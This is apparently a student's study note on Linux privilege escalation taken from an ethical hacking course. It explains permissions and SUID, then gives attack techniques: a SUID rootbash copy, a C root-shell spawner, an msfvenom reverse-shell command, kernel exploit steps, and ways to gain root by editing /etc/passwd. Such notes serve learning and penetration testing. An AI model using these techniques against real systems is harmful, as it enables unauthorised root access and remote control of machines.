
2024-06-13 15:33

Source: #privesc 

Tags: [[linux]]

All Privilege Escalation are effectively examples of access control violations.
#### Permissions in Linux
##### User 
- Users are identified by an integer user ID (UID). The “root” user account is a special type of account in Linux. It has an UID of 0, and the system grants this user access to every file
##### Group
- By default, a user’s primary group has the same name as their user account
##### File & Directory  
- All files & directories have a single owner and a group.
##### Special Permissions
- **setuid (SUID)** bit When set, files will get executed with the privileges of the file owner.
- **setgid (SGID)** bit When set on a file, the file will get executed with the privileges of the file group. 
- When set on a directory, files created within that directory will inherit the group of the directory itself
##### Viewing Permission
```
$ ls -l /bin/date
-rwxr-xr-x 1 root root 60416 Apr 28 2010 /bin/date
```
- above the file is owned by root and belongs to the root group 
- The first 10 characters indicate the permissions set on the file or directory.
- The first character simply indicates the type (e.g. '-' for file, 'd' for directory)
- The remaining 9 characters represent the 3 sets of permissions (owner, group, others).
- Each set contains 3 characters, indicating the read (r), write (w), and execute (x) permissions. 
- SUID/SGID permissions are represented by an 's' in the execute position
##### User ID's 
- each user has 3 user IDs in Linux (real, effective, and saved)
	- Real ID is who they actually are (the ID defined in /etc/passwd).
	- Effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID. The effective ID is used in most access control decisions to verify a user, and commands such as `whoami` use the effective ID
	- Saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID
- `id` command will print real and effective uid/gid
- the command below will show the real, effective, saved, and file system user / group IDs of the current process (i.e. our shell)
```
# cat /proc/$$/status | grep "[UG]id"
```








#### Spawning Root shell

use the following methods to spawn a root shell in situations where commands can be executed as root-
##### rootbash SUID

To spawn a root shell, create a copy of the /bin/bash executable file (eg. rename it [[rootbash]]), make sure it is owned by the root user, and has the SUID bit set.
A root shell can be spawned by simply executing the rootbash file with the -p command line option. The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times)

##### Custom Executables

There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:  
```
int main() { 
	setuid(0); 
	system("/bin/bash -p"); 
} 

Compile using:
$ gcc -o <name> <filename.c>
```

##### msfvenom

If a reverse shell is preferred, [[msfvenom]] can be used to generate an executable (.elf) file: 
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```
This reverse shell can be caught using netcat or Metasploit’s own multi/handler module.

##### Native Reverse Shells

There are multiple ways to spawn [[revshell]] natively on many Linux distributions. A good tool for suggesting these is: https://github.com/mthbernardes/rsg 


#### Privilege Escalation Tools

##### Linux Smart Enumeration(lse.sh)
[diego-treitos/linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels (github.com)](https://github.com/diego-treitos/linux-smart-enumeration)

##### LinEnum
Can copy interesting files for export, and search for files containing a keyword (eg. password)
[rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks (github.com)](https://github.com/rebootuser/LinEnum)

#### Kernel Exploits

Kernel acts as a layer between application software and the actual computer hardware
Finding and using kernel exploits is usually a simple process:
1. Enumerate kernel version (uname -a). 
2. Find matching exploits (Google, ExploitDB, GitHub, [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2))
**while finding exploits make sure to search correct version and flavor of Linux**  
4. Compile and run.
Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash. **Kernel exploits should be the last resort** 

#### Service Exploits 

- See the services that are running as root if vulnerable services are running as root, exploiting them can lead to command execution as root . 
- Service exploits can be found the same way as kernel exploits 
```
$ ps aux | grep "^root"
```
above command will show all processes that are running as root:
##### Enumerating Program Versions
```
$ <program> --version 
$ <program> -v

On Debian-like distributions, dpkg can show installed programs and their version:
$ dpkg -l | grep <program>  

On systems that use rpm, the following achieves the same
$ rpm –qa | grep <program>
```
Example of the above is on [[Services Running as Root]] 
 
##### Port Forwarding

In some instances, a root process may be bound to an internal port, through which it communicates. 
If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded[[Port Forwarding]] using SSH to your local machine: 
```
$ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```

#### Weak File Permissions
##### Useful commands (can be automated using LinEnum)

Find all writable files in /etc: 
`$ find /etc -maxdepth 1 -writable -type f`

Find all readable files in /etc: 
`$ find /etc -maxdepth 1 -readable -type f`

Find all directories which can be written to:
`$ find / -executable -writable -type d 2> /dev/null`
##### /etc/shadow

- `/etc/shadow` file contains user password hashes
- `/etc/passwd` historically contained user password hashes
- For backwards compatibility, if the second field of a user row in `/etc/passwd `contains a password hash, it takes precedent over the hash in `/etc/shadow`
- If we can write to `/etc/passwd`, we can easily enter a known (generate a hash for a known phrase by using` openssl passwd "pass_phrase"`) password hash (in place of 'x' after the 1st colon in the `/etc/passwd` file) for the root user, and then use the `su` command to switch to the root user. 
- Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different
- the password hash when cat'd out from `/etc/shadow` lies between the 1st and 2nd colon
##### /etc/passwd 

The root account in `/etc/passwd` is usually configured like this:
```
root:x:0:0:root:/root:/bin/bash
```
The “x” in the second field instructs Linux to look for the password hash in the `/etc/shadow` file
- In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password
##### Backups

It is always worth exploring the file system looking for readable backup files. Some common places include user home directories, the / (root) directory, /tmp, and /var/backups


### References

[Linux Privilege Escalation Tutorial: Become an Ethical Hacker | Udemy](https://www.udemy.com/course/linux-privilege-escalation/)